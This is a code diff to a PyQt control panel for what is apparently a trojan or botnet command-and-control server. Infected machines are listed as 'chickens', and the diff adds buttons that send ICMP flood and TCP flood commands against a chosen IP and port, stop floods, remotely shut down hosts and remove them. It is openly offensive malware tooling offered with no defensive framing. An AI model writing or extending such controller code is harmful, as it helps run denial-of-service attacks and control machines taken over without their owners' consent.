@@ -17,6 +17,7 @@ class Conmunication(QObject):
     chickenUpSignal = pyqtSignal(Chienken)
     selectChangeSignal = pyqtSignal(str)
     listFreshSignal = pyqtSignal(int, Chienken)
+    refreshSignal = pyqtSignal()
 
 class ServerMain(QWidget, Ui_Server):
     def __init__(self):
@@ -29,8 +30,8 @@ class ServerMain(QWidget, Ui_Server):
         self.signals.chickenUpSignal.connect(self.addToCurrentList)
         self.freshCurrentList()
         self.ipInput.setText(self.trojanServer.bind_IP)
-        self.usp.setText(str(self.trojanServer.utpPort))
-        self.urp.setText(str(self.trojanServer.utpRecvPort))
+        self.usp.setText(str(self.trojanServer.udpPort))
+        self.urp.setText(str(self.trojanServer.udpRecvPort))
         self.tp.setText(str(self.trojanServer.tcpPort))
         self.bind()
         print("Welcome!")
@@ -47,6 +48,33 @@ class ServerMain(QWidget, Ui_Server):
         self.chickenlist.customContextMenuRequested.connect(self.myListWidgetContext)
         self.all_button.clicked.connect(self.checkall)
         self.reverse_button.clicked.connect(self.reverseCheck)
+        self.icmpButton.clicked.connect(self.icmp)
+        self.signals.refreshSignal.connect(self.freshlist.clicked.emit)
+        self.deletebutton.clicked.connect(self.deleteSelected)
+        self.shutdownButton.clicked.connect(self.shutChicken)
+        self.stopbutton.clicked.connect(lambda :self.opeate("floodStop"))
+        self.tcpfloodbutton.clicked.connect(self.tcpFlood)
+
+    def deleteSelected(self):
+        selected = self.getSelect()
+        for i in reversed(selected):
+            self.trojanServer.cmdQ.put("delete %d"%i)
+        # for c in selected:
+        #     self.trojanServer.cmdQ.put("msg " + str(c) + " %s" % type)
+
+    def icmp(self):
+        self.opeate("icmpFlood %s" % self.attack_ip.text())
+
+    def tcpFlood(self):
+        self.opeate("tcpFlood %s %s" % (self.attack_ip.text(), self.attack_port.text()))
+
+    def shutChicken(self):
+        self.opeate(r"shutdown \s")
+
+    def opeate(self, type):
+        selected = self.getSelect()
+        for c in selected:
+            self.trojanServer.cmdQ.put("msg "+str(c)+" %s" % type)
 
     def freshItem(self, index, chicken):
         check:QCheckBox = self.chickenlist.itemWidget(self.chickenlist.item(index))
@@ -59,12 +87,15 @@ class ServerMain(QWidget, Ui_Server):
         checkbox:QCheckBox = self.chickenlist.itemWidget(item)
         row = int(checkbox.text().split(']')[0][1:])
         popMenu = QMenu()
+
         a1 = QAction(u'连接', self)
+        a2 = QAction(u'删除', self)
+
         popMenu.addAction(a1)
-        popMenu.addAction(QAction(u'删除', self))
-        popMenu.addAction(QAction(u'修改', self))
+        popMenu.addAction(a2)
 
         a1.triggered.connect(lambda :self.openDetail(row))
+        a2.triggered.connect(lambda :self.trojanServer.cmdQ.put("delete %d"%row))
 
         popMenu.exec_(QCursor.pos())
 
@@ -112,9 +143,17 @@ class ServerMain(QWidget, Ui_Server):
         print("check "+sender.text().split(']')[0][1:])
 
 
-
     def addToCurrentList(self, chicken:Chienken):
         self.freshCurrentList()
+
+    def getSelect(self):
+        count = self.chickenlist.count()
+        res = []
+        for i in range(0, count):
+            box: QCheckBox = self.chickenlist.itemWidget(self.chickenlist.item(i))
+            if box.isChecked():
+                res.append(i)
+        return res
 
     def checkall(self):
         count = self.chickenlist.count()
@@ -134,6 +173,9 @@ class ServerMain(QWidget, Ui_Server):
         for i in range(0, count):
             box: QCheckBox = self.chickenlist.itemWidget(self.chickenlist.item(i))
             box.setChecked(False)
+
+    def closeEvent(self, event):
+        self.save()
 
 
 
